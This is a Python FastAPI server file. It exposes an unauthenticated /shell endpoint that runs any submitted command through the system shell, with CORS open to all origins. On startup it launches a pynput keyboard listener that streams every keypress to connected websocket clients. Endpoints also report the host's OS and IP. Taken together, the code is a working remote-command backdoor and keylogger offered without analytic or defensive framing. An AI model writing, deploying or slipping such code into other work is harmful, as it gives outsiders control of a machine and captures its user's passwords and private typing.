from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from utils import get_user_os, get_ip
import subprocess
import threading
from pynput import keyboard
import asyncio

app = FastAPI()

# Allow all origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

connected_websockets = set()
ws_lock = threading.Lock()

@app.get("/os")
def read_os():
    return {"os": get_user_os()}

@app.get("/ip")
def read_ip():
    return {"ip": get_ip()}

@app.post("/shell")
async def run_shell(request: Request):
    data = await request.json()
    command = data.get("command")
    if not command:
        return {"error": "No command provided."}
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        return {"error": str(e)}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    with ws_lock:
        connected_websockets.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            await websocket.send_text(f"Echo: {data}")
    except WebSocketDisconnect:
        with ws_lock:
            connected_websockets.discard(websocket)

# Helper to send key events to all websockets from a non-async thread
async def send_key_to_all(key_str):
    with ws_lock:
        websockets = list(connected_websockets)
    for ws in websockets:
        try:
            await ws.send_text(f"Key pressed: {key_str}")
        except Exception:
            pass

def on_press(key):
    key_str = str(key)
    loop = asyncio.get_event_loop()
    if loop.is_running():
        asyncio.run_coroutine_threadsafe(send_key_to_all(key_str), loop)


def start_keyboard_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

@app.on_event("startup")
def startup_event():
    threading.Thread(target=start_keyboard_listener, daemon=True).start()
